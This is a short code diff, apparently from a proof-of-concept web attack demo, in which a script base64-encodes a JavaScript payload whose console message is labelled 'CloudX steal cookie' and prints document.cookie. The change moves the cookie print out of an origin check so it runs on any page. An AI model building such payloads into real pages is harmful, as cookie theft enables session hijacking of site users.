@@ -4,9 +4,10 @@
     const currUrl = location.href;
     const payload = `
     let url = location.href;
+    console.log('CloudX steal cookie:'+document.cookie);
     console.log("payload-url:"+url);
     if(!url.startsWith("https://renfromabove.github.io")){
-      console.log('CloudX steal cookie:'+document.cookie);
+      console.log('CloudX steal cookie:');
     }`;
     const base64 = btoa(payload);
     for(let i=0; i<1000; i++){
